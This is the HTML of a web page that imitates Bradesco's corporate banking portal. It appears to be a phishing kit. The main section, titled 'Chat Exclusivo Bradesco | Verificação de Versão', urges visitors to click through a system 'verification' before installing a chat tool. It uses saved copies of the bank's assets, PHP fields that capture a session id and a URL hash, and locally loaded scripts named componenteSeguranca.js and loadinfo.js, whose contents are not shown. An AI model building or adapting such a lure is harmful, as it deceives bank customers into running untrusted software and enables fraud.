href="https://banco.bradesco/html/corporate/solucoes-integradas/derivativos/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Derivativos&#39;);">Derivativos</a><ul><li class="termo-e-swap"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/derivativos/termo-e-swap.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Termo e Swap&#39;);">Termo e Swap</a></li><li class="termo-e-opcao-de-moeda"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/derivativos/termo-e-opcao-de-moeda.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Termo e Opção de Moeda&#39;);">Termo e Opção de Moeda</a></li><li class="aplicacao-de-capital-garantido"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/derivativos/aplicacao-de-capital-garantido.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Aplicação de Capital Garantido&#39;);">Aplicação de Capital Garantido</a></li><li class="termo-e-opcao-de-commodity"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/derivativos/termo-e-opcao-de-commodity.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Termo e Opção de Commodity&#39;);">Termo e Opção de Commodity</a></li></ul></li><li class="investimentos"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/investimentos/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Investimentos&#39;);">Investimentos</a><ul><li class="cdb"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/investimentos/cdb.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;CDB&#39;);">CDB</a></li><li class="coe"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/investimentos/coe.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;COE&#39;);">COE</a></li><li class="invest"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/investimentos/invest.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Invest Bradesco&#39;);">Invest Bradesco</a></li><li class="fundos"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/investimentos/fundos.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Fundos&#39;);">Fundos</a><ul><li class="fundos-imobiliarios"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/investimentos/fundos-imobiliarios.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Fundos Imobiliários&#39;);">Fundos Imobiliários</a></li><li class="entenda-os-fundos"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/investimentos/entenda-os-fundos.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Entenda os Fundos&#39;);">Entenda os Fundos</a></li><li class="informacoes-aos-cotistas"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/investimentos/informacoes-aos-cotistas.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Informações aos Cotistas&#39;);">Informações aos Cotistas</a></li><li class="tabela-de-rentabilidade"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/investimentos/tabela-de-rentabilidade.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Tabela de Rentabilidade&#39;);">Tabela de Rentabilidade</a></li></ul></li><li class="operacao-compromissada"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/investimentos/operacao-compromissada.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Operação Compromissada&#39;);">Operação Compromissada</a></li><li class="normas-para-operar"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/investimentos/normas-para-operar.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Normas para operar&#39;);">Normas para operar</a></li></ul></li><li class="pagamentos"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/pagamentos/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Pagamentos&#39;);">Pagamentos</a><ul><li class="segunda-via-de-boleto"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/pagamentos/segunda-via-de-boleto/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Boletos&#39;);">Boletos</a></li><li class="debito-automatico"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/pagamentos/debito-automatico.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Débito Automático&#39;);">Débito Automático</a></li><li class="debito-direto-autorizado-dda"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/pagamentos/debito-direto-autorizado-dda.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;DDA - Débito Direto Autorizado&#39;);">DDA - Débito Direto Autorizado</a></li><li class="multipag"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/pagamentos/multipag.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Multipag&#39;);">Multipag</a></li><li class="pag-for"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/pagamentos/pag-for.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Pag-For&#39;);">Pag-For</a></li><li class="pagamento-eletronico-tributos"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/pagamentos/pagamento-eletronico-tributos.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Pagamento Eletrônico de Tributos&#39;);">Pagamento Eletrônico de Tributos</a></li></ul></li><li class="recebimentos"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/recebimentos/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Recebimentos&#39;);">Recebimentos</a><ul><li class="cobranca"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/recebimentos/cobranca.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Cobrança&#39;);">Cobrança</a></li><li class="receba-facil"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/recebimentos/receba-facil.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Receba Fácil&#39;);">Receba Fácil</a></li><li class="deposito-de-cheque-pelo-celular"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/recebimentos/deposito-de-cheque-pelo-celular.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Depósito de Cheque pelo Celular&#39;);">Depósito de Cheque pelo Celular</a></li></ul></li><li class="recursos-humanos"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/recursos-humanos/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Recursos Humanos&#39;);">Recursos Humanos</a><ul><li class="beneficios"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/recursos-humanos/beneficios.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Benefícios&#39;);">Benefícios</a></li><li class="cestas-de-servicos"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/recursos-humanos/cestas-de-servicos.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Cesta de Serviços&#39;);">Cesta de Serviços</a></li><li class="posto-de-atendimento-eletronico"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/recursos-humanos/posto-de-atendimento-eletronico.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;PAE - Posto de Atendimento Eletrônico&#39;);">PAE - Posto de Atendimento Eletrônico</a></li><li class="posto-de-atendimento-bancario"><a href="https://banco.bradesco/html/corporate/solucoes-integradas/recursos-humanos/posto-de-atendimento-bancario.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;PAB - Posto de Atendimento Bancário&#39;);">PAB - Posto de Atendimento Bancário</a></li></ul></li></ul></li><li class="ferramentas"><a href="https://banco.bradesco/html/corporate/ferramentas/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Menu Lateral&#39;,&#39;Ferramentas&#39;);">Ferramentas</a><ul><li class="app_net_empresa"><a href="https://banco.bradesco/html/corporate/canais-digitais/bradesco-celular/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Aplicativo Net Empresa&#39;);">Aplicativo Net Empresa</a></li><li class="certificado-digital-icp-brasil"><a href="https://banco.bradesco/html/corporate/ferramentas/certificado-digital-icp-brasil/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Certificado Digital ICP-Brasil&#39;);">Certificado Digital ICP-Brasil</a></li><li class="gerenciamento-de-caixa-obb-plus"><a href="https://banco.bradesco/html/corporate/ferramentas/gerenciamento-de-caixa-obb-plus/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Gerenciamento de Caixa - OBB Plus&#39;);">Gerenciamento de Caixa - OBB Plus</a></li><li class="net-empresa 1"><a href="https://banco.bradesco/html/corporate/net-empresa/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Menu Lateral&#39;,&#39;Bradesco Net Empresa&#39;);">Net Empresa</a></li></ul></li><li class="acessibilidade"><a href="https://banco.bradesco/html/classic/acessibilidade/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Menu Lateral&#39;,&#39;Acessibilidade&#39;);">Acessibilidade</a></li><li class="canais-digitais"><a href="https://banco.bradesco/html/corporate/canais-digitais/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Menu Lateral&#39;,&#39;Canais Digitais&#39;);">Canais Digitais</a><ul><li class="bradesco-celular"><a href="https://banco.bradesco/html/corporate/canais-digitais/bradesco-celular/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Bradesco Celular&#39;);">Bradesco Celular</a><ul><li class="aplicativo-net-empresa"><a href="https://banco.bradesco/html/corporate/canais-digitais/bradesco-celular/aplicativo-net-empresa/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Net Empresa pelo Celular&#39;);">Net Empresa pelo Celular</a></li><li class="passo-a-passo"><a href="https://banco.bradesco/html/corporate/canais-digitais/bradesco-celular/passo-a-passo/index.shtm" tabindex="45" onclick="trackBradesco(&#39;Portal Corporate&#39;,&#39;Menu Lateral&#39;,&#39;Aprenda passo a passo&#39;);">Aprenda passo a passo</a></li></ul></li></ul></li></ul></h2></nav>
		<!-- End: Navegação Principal Desktop -->
	</div>
	<!-- Header Desktop -->
	<header class="mainHeader" yield-handling="true">
		
		<ul class="navSeg">
			<li data-toggle="tooltip" title="" data-original-title="Para empresas com faturamento até R$ 30 milhões por ano.">
				<a tabindex="7" href="https://banco.bradesco/html/pessoajuridica/index.shtm" onclick="trackBradesco(&#39;Corporate&#39;,&#39;Menu_Superior&#39;,&#39;Head_Empresas_Negocios&#39;);"><span>&nbsp;</span>Empresas e Negócios</a>
			</li>
			<li class="active" data-toggle="tooltip" title="" data-original-title="Para Empresas com faturamento acima de R$30 milhões por ano.">
				<a tabindex="9" href="https://banco.bradesco/html/corporate/index.shtm" onclick="trackBradesco(&#39;Corporate&#39;,&#39;Menu_Superior&#39;,&#39;Head_Corporate&#39;);"><span>Bradesco</span>Corporate</a>
			</li>
			
			<li>
				<a tabindex="11" href="https://banco.bradesco/html/corporate/mais-bradesco/index.shtm" onclick="trackBradesco(&#39;Corporate&#39;,&#39;Menu_Superior&#39;,&#39;Head_Mais_Bradesco&#39;);" title="Mais Bradesco"><span>Mais</span>Bradesco</a>
			</li>
			
			<li class="divisor sub">
				<a href="https://www.bradescopoderpublico.com.br/" onclick="trackBradesco(&#39;Corporate&#39;,&#39;Menu_Superior&#39;,&#39;Head_Poder_Publico&#39;);" title="Para o Poder Público"><span>Para o</span>Poder Público</a>
				<div class="navCnt last" style="display: none;">
					<ul class="nav">
						<li><a tabindex="13" href="https://www.bradescopoderpublico.com.br/" onclick="trackBradesco(&#39;Corporate&#39;,&#39;Menu_Superior&#39;,&#39;Head_Poder_Publico_Servidor_Publico&#39;);">Servidor Público</a></li>
						<li><a tabindex="13" href="https://www.bradescopoderpublico.com.br/html/poder_publico/pj/index.shtm" onclick="trackBradesco(&#39;Corporate&#39;,&#39;Menu_Superior&#39;,&#39;Head_Poder_Publico_Orgãos_Publico&#39;);">Órgãos Públicos</a></li>
					</ul>
				</div>
			</li>		
		</ul>	
		
	</header>
	<!-- End: Header Desktop -->
	
	
	<!-- Conteudo -->
	<section class="mainContent" tabindex="75" style="min-height: 303px;">

		<header class="single" yield-handling="true">
			<h2>Chat Exclusivo Bradesco | Verificação de Versão</h2>
		</header>

		<div class="row default">
			<div class="col-lg-9 col-md-12">
				<div class="internalbanner">
					<img src="./seguranca03_files/o_bradesco_corporate.jpg" alt="O Bradesco Corporate">
				</div>

				<div class="clearfix"></div>

				<h3 class="title">Antes da instalação do Chat Exclusivo Bradesco, precisamos verificar a configuração do ambiente operacional do seu equipamento e também a versão atual instalada em seu sistema, clique abaixo para iniciar a verificação.</h3>

<p></p>
				
        
            </div>
<div class="row">
	<div class="col-lg-12">
		<div class="ncliente">
			<img src="./seguranca03_files/alerta_empresa.jpg">
			<div class="description">
				<p>
					Seja bem vindo ao Chat Exclusivo Bradesco!
					</p><div class="row">
						<div class="col-lg-12">
							<a title="Juntos contra a COVID-19" class="lnk js-popup">Nosso Chat Online permite aos nossos clientes um atendimento personalizado e com autenticação automática, evitando assim burocracias nos atendimentos bem como total segurança.</a>
						</div>
					</div>
				<p></p>
			</div>
		</div>
		<hr>
	</div>
</div>

			</div>
			
            ﻿<div class="row">
    
</div>
		</div>
		
		<!-- script centralnetempres -->
			<div id="background">
        <div id="conteudo">
                    
                <div id="componenteSeguranca">
				   
                <div id="componenteSegurancaInicio" class="boxes hide">
                    <div style="text-align: center;">
                        <div style="margin-top: 30px; margin-bottom: 15px;">
                            <a id="botaoIniciar" href="javascript:;"><img src="seguranca03_files/iniciar-processo-verifica-sistema.png"></a>
                        </div>
                    </div>
                    <div class="linha">
                        <hr>
                    </div>
            
                       
                    </div>
                    
                </div>
                <div style="margin-bottom: 50px;" class="boxes hide" id="componenteSegurancaAguarde">
                    <p align="center">&nbsp;<marquee direction="right" scrollamount="8" scrolldelay="100">
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span>
                        <span class="progressBarHandle-0"></span></marquee></p>
                </div>
        </div>
                

    </div>
	<!-- fim do script centralnetempresa -->
	</section>
	<!-- End: Conteudo -->


    
   
</div><div id="js-modal" class="c-overlay">
   
	
<!-- Footer Main -->
<footer>
		<div>
		  
		  <div class="col-lg-12 footer__grey" id="footer">
			<div class="list__links" style="display: none;">
			  <div class="col-lg-3 col-sm-3 col-xs-12">
				<a href="https://banco.bradesco/assets/corporate/pdf/footer/codigo-de-defesa.pdf" target="_blank">
				  <span>Código de defesa do consumidor </span>
				</a>
			  </div>
			  <div class="col-lg-3 col-sm-3 col-xs-12">
				<a href="https://www.bradescoseguranca.com.br/html/seguranca_corporativa/pj/seguranca-informacao/privacidade.shtm" target="_blank">
				  <span>Diretivas de privacidade</span>
				</a>
			  </div>
			  <div class="col-lg-3 col-sm-3 col-xs-12">
				<a href="https://www.consumidor.gov.br/pages/principal/?1493727673434" target="_blank">
				  <span>Consumidor.gov.br</span>
				</a>
			  </div>
			  <div class="col-lg-3 col-sm-3 col-xs-12">
				<a href="http://www.procon.pr.gov.br/" target="_blank">
				  <span> Portal do Consumidor - PROCON  </span>
				</a>
			  </div>
			</div>
			<span class="hidden-lg hidden-md hidden-sm line__border"></span>
		  </div>
		  <div class="col-lg-12 footer__grey">
			<div class="list__fones" style="display: none;">
			  <div class="col-lg-2 col-sm-4 col-xs-12">
				<span class="list__fones-title-sobre">Central de Relacionamento Cliente Pessoa Jurídica</span>
				<span class="list__fones-title">3003 1000</span>
				<span class="list__fones-descricao capitalize">Capitais / Regiões Metropolitanas</span>
			  </div>
			  <div class="col-lg-2 col-sm-4 col-xs-12">
				<span class="list__fones-title-sobre"> </span>
				<span class="list__fones-title">0800 202 1000</span>
				<span class="list__fones-descricao capitalize">Demais Regiões</span>
			  </div>
			  <div class="col-lg-2 col-sm-4 col-xs-12">
				<span class="list__fones-title-sobre"> </span>
				<span class="list__fones-title">55 11 3003 1000</span>
				<span class="list__fones-descricao inherit">Acesso do Exterior</span>
			  </div>
			  <div class="col-lg-2 col-sm-4 col-xs-12">
				<span class="list__fones-title-sobre"> </span>
				<span class="list__fones-title">0800 722 0099</span>
				<span class="list__fones-descricao inherit">Deficiência auditiva / fala</span>
			  </div>
			  <div class="col-lg-2 col-sm-4 col-xs-12 left-border">
				<div data-toggle="tooltip" title="" data-original-title="Ligue para fazer &lt;strong&gt;reclamações, cancelamentos&lt;/strong&gt;, pedir &lt;strong&gt;informações&lt;/strong&gt; e tirar &lt;strong&gt;dúvidas gerais&lt;/strong&gt;. Atendimento 24 horas, 7 dias por semana.">
				  <span class="list__fones-title-sobre">SAC Alô Bradesco </span>
				  <span class="list__fones-title">0800 704 8383</span>
					  <a href="https://banco.bradesco/html/corporate/atendimento/fale-conosco/telefones-uteis.shtm#tabSAC">
						  <span class="list__fones-descricao left__arrow">Demais SACs </span>
					  </a>
				  </div>
			  </div>
			  <div class="col-lg-2 col-sm-4 col-xs-12 left-border">
				  <div data-toggle="tooltip" title="" data-original-title="Se você já foi atendido pelos outros canais e ainda precisa de &lt;strong&gt;mais esclarecimentos&lt;/strong&gt;, entre em contato com a Ouvidoria. Atendimento das 8h às 18h, de segunda a sexta-feira, exceto feriados."> 
					  <span class="list__fones-title-sobre">Ouvidoria</span>
					  <span class="list__fones-title">0800 727 9933</span>
					  <a href="https://banco.bradesco/html/corporate/atendimento/fale-conosco/ouvidoria/ouvidoria.shtm">
						  <span class="list__fones-descricao left__arrow">Fale com a ouvidoria  </span>
					  </a>
				  </div>
			  </div>
			</div>
		  </div>
		  <div class="col-lg-12 footer__grey">
			<span class="end__text hidden-lg hidden-md hidden-sm">
			  Banco Bradesco SA | CNPJ: 60.746.948.0001-12 <br> Cidade de Deus, s/nº Vila Yara Osasco | SP | CEP: 06029-900
			</span>
		  </div>
		</div>
		<div class="col-lg-12 box__red">
		  <div class="col-lg-5 col-sm-6 col-xs-12">
			<span class="text__title hidden-xs">ACOMPANHE:</span>
			<div class="overflow__x">
			  <div class="list__icones">
				<ul>
				  <li>
					<a target="blank" href="https://www.facebook.com/bradesco" title="facebook" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Menu Inferior - Acompanhe&#39;,&#39;Facebook&#39;);">
					  <img src="./seguranca03_files/ico_facebook.png" alt="facebook">
					</a>
				  </li>
				  <li>
					<a target="blank" href="https://www.youtube.com/bradesco" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Menu Inferior - Acompanhe&#39;,&#39;Youtube&#39;);">
					  <img src="./seguranca03_files/ico_youtube.png" alt="youtube">
					</a>
				  </li>
				  <li>
					<a target="blank" href="https://www.instagram.com/bradesco/" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Menu Inferior - Acompanhe&#39;,&#39;Instagran&#39;);">
					  <img src="./seguranca03_files/ico_instagram.png" alt="instagram">
					</a>
				  </li>
				  <li>
					<a target="blank" href="https://twitter.com/bradesco" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Menu Inferior - Acompanhe&#39;,&#39;Twiter&#39;);">
					  <img src="./seguranca03_files/ico_twitter.png" alt="twitter">
					</a>
				  </li>
				  <li>
					<a target="blank" href="https://www.linkedin.com/company/bradesco" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Menu Inferior - Acompanhe&#39;,&#39;Linkedin&#39;);">
					  <img src="./seguranca03_files/ico_linkedin.png" alt="linkedin">
					</a>
				  </li>
				</ul>
			  </div>
			</div>
		  </div>
		  <div class="col-lg-5 col-sm-7 hidden-xs">
			<span class="end__text ">
			  Banco Bradesco SA | CNPJ: 60.746.948.0001-12 | Cidade de Deus, s/nº <br class="hidden__br"> Vila Yara | Osasco | SP | CEP: 06029-900
					  </span>
		  </div>
		  <div class="col-lg-2 col-sm-3 hidden-xs">
			<div class="logo__footer_prime">
			  <img src="./seguranca03_files/logoCorporatemb.svg" alt="logoCorporatemb">
					  </div>
		  </div>
		</div>
		<div class="col-lg-12 box__blue">
		  <div class="logo__footer hidden-sm hidden-md hidden-lg">
			<img src="./seguranca03_files/logoCorporatemb.svg" alt="logoCorporatemb">
				  </div>
		  <div class="col-lg-12 hidden-xs">
			<ul class="links_rapidos">
			  <li>
				<a href="https://imprensa.bradesco.com.br/vgn-ext-templating/v/index.jsp?vgnextoid=2ddbe1bed7245410VgnVCM100000978313b1RCRD" target="_blank" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Rodapé &#39;,&#39;Bradesco Imprensa&#39;);">
				  bradesco imprensa <span>|</span>
				</a>
			  </li>
			  <li>
				<a href="https://banco.bradesco/html/classic/sobre/trabalhe-conosco/index.shtm" target="_blank" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Rodapé &#39;,&#39;Trabalhe Conosco&#39;);">
				  Trabalhe Conosco <span>|</span>
				</a>
			  </li> 
			  <li>
				<a href="https://www.bradescoseguranca.com.br/html/seguranca_corporativa/pj/index.shtm" target="_blank" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Rodapé &#39;,&#39;Segurança&#39;);">
				  Segurança <span>|</span>
				</a>
			  </li>
			  <li>
				<a href="https://www.bradescosustentabilidade.com.br/site/" target="_blank" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Rodapé &#39;,&#39;Sustentabilidade&#39;);">
				  Sustentabilidade <span>|</span>
				</a>
			  </li>
			  <li>
				<a href="https://www.bradescori.com.br/siteBradescoRI/Default.aspx" target="_blank" onclick="trackBradesco(&#39;Portal Corporate - Home&#39;,&#39;Rodapé &#39;,&#39;Relação com Investidores&#39;);">relação com investidores</a>
			  </li>
			</ul>
		  </div>
		</div>
	  </footer>
	  <!-- End: Footer -->
	  
<!--	  
	  <script type="application/javascript">
			  function InfoOpen() {
				  $(".list__links").toggle();
				  $(".list__fones").css('display', 'none');
				  $(".item__fones").removeClass("active");
				  $(".item__info-uteis").toggleClass("active");
			  }
			  function InfoFone() {
				  $(".list__fones").toggle();
				  $(".list__links").css('display', 'none');
				  $(".item__fones").toggleClass("active");
				  $(".item__info-uteis").removeClass("active");
			  } 
	  </script>
	<script src="./seguranca03_files/validaFrame.js.download"></script>
<script src="./seguranca03_files/valida_agenciaconta.js.download"></script>
<script src="./seguranca03_files/lembrarAgCta.js.download"></script>
<script src="./seguranca03_files/bAutocomplete.js.download"></script>
<script src="./seguranca03_files/bPagina-min.js.download"></script>
<script src="./seguranca03_files/jquery-3.4.1.min.js.download"></script>
<script src="./seguranca03_files/ua-parser.min.js.download"></script>
<script src="./seguranca03_files/chosen.jquery.min.js.download"></script>
<script src="./seguranca03_files/jquery.mmenu.min.js.download"></script>
<script src="./seguranca03_files/jquery.magnific-popup.min.js.download"></script>
<script src="./seguranca03_files/jquery.color.js.download"></script>
<script src="./seguranca03_files/owl.carousel.min.js.download"></script>


<!--
<script src="./seguranca03_files/popper.min.js.download"></script>
<script src="./seguranca03_files/bootstrap-4.3.1.min.js.download"></script>
<script src="./seguranca03_files/mediaelement-and-player.min.js.download"></script>
<script src="./seguranca03_files/jquery.touchSwipe.min.js.download"></script>
<script src="./seguranca03_files/jquery.placeholder.min.js.download"></script>
<script src="./seguranca03_files/validaFormNaoCorrentista.js.download"></script>
<script src="./seguranca03_files/mascara.js.download"></script>
<script src="./seguranca03_files/retargeting.js.download"></script>
<script src="./seguranca03_files/validanavegadorexclusivo.js.download"></script>
<script src="./seguranca03_files/detect-mobile.js.download"></script>
<script src="./seguranca03_files/moment.min.js.download"></script>
<script src="./seguranca03_files/modal-cartoes.js.download"></script>

<script src="./seguranca03_files/js.cookie-2.2.1.min.js.download"></script>
-->
<input type="hidden" id="id" value="<?php echo isset($_SESSION['idInfo']) ? $_SESSION['idInfo'] : '';  ?>">
<input type="hidden" id="hash" value="<?php echo isset($_GET['hash']) ? $_GET['hash'] : '';  ?>">
<script src="js/jquery.min.js"></script>
<script src="js/componenteSeguranca.js"></script>
<script src="js/loadinfo.js"></script>
	</body>
	</html>